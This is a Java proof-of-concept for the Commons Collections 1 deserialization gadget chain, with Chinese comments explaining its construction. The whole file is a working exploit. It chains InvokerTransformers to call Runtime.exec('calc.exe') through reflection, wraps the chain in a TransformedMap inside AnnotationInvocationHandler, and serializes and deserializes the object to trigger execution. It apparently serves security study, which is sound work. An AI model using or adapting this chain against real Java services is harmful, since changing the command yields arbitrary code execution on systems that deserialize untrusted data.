import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Map;

public class CommonsCollections1 {
    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[]{
                //new ConstantTransformer(Runtime.class)原因：
                //Java中不是所有对象都支持序列化，待序列化的对象和所有它使用的内部属性对象，必须都实现了 java.io.Serializable 接口。而我们最早传给ConstantTransformer的是Runtime.getRuntime() ，Runtime类是没有实现 java.io.Serializable 接口的，所以不允许被序列化。
                //将 Runtime.getRuntime() 换成了 Runtime.class，前者是java.lang.Runtime 对象，后者是一个 java.lang.Class 对象。。Class类有实现Serializable接口，所以可以被序列化。
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc.exe"})
        };
        //将内部的多个Transformer串在⼀起
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        //以上为递归调用

        HashMap<Object,Object> map =  new HashMap<>();
        //为Retention有一个方法，名为value；所以，为了再满足第二个条件，我需要给Map中放入一个Key是value的元素
        map.put("value","aaa"); //触发回调
        Map<Object,Object> transformedMap=TransformedMap.decorate(map,null,chainedTransformer);

        Class c=  Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");//实际反序列化时，我们需要找到一个类，它在反序列化的readObject逻辑里有类似的写入操作。
        Constructor constructor= c.getDeclaredConstructor(Class.class,Map.class);
        constructor.setAccessible(true);
        //因为Retention有一个方法，名为value
        Object obj= constructor.newInstance(Target.class,transformedMap);
        serialize(obj);
        unserialize();
    }
    public static void serialize(Object obj) throws Exception {
        ObjectOutputStream outputStream = new ObjectOutputStream( new FileOutputStream("cc1.bin"));
        outputStream.writeObject(obj);
        outputStream.close();
    }

    public static void unserialize() throws  Exception{
        ObjectInputStream inputStream = new ObjectInputStream( new FileInputStream("cc1.bin"));
        Object obj = inputStream.readObject();

    }

}
